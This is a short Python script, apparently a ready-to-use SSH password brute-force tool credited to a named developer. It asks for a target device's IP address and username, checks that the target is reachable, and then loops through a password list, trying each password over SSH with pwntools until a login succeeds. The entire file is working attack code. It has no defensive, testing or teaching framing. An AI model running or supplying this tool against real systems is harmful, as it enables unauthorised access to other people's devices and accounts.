from pwn import *
import paramiko
import socket
import subprocess

attempts = 1
print("<--This Tool is Designed by Mr. Somil Modi-->")
print("Developer GitHub : https://github.com/somil-modi\n")

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def is_reachable(ip):
    try:
        command = ['ping', '-c', '1', ip] if os.name != 'nt' else ['ping', '-n', '1', ip]
        response = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return response.returncode == 0
    except Exception as e:
        print(f"Error pinging IP address: {e}")
        return False

host = input("Please provide Targeted device IP address: ")
while not is_valid_ip(host) or not is_reachable(host):
    if not is_valid_ip(host):
        print("Invalid IP address format. Please try again.")
    elif not is_reachable(host):
        print("IP address is unreachable. Please try again.")
    host = input("Please provide Targeted device IP address: ")


username = input("Please Provide User Name of Targeted Device: ")
with open("password.txt", "r") as password_list:
    for password in password_list:
        password = password.strip()
        try:
            print(f"[{attempts}] Attempting password: {password}")
            ssh_client = ssh(host=host, user=username, password=password, timeout=1)
            if ssh_client.connected():
                print(f"[+] Connected with password: {password}")
                ssh_client.close()
                break
        except paramiko.ssh_exception.AuthenticationException:
            print("[-] Authentication failed.")
        except paramiko.ssh_exception.SSHException as sshException:
            print(f"[-] SSH Exception: {sshException}")
        except Exception as e:
            print(f"[-] Connection failed: {e}")
        attempts += 1
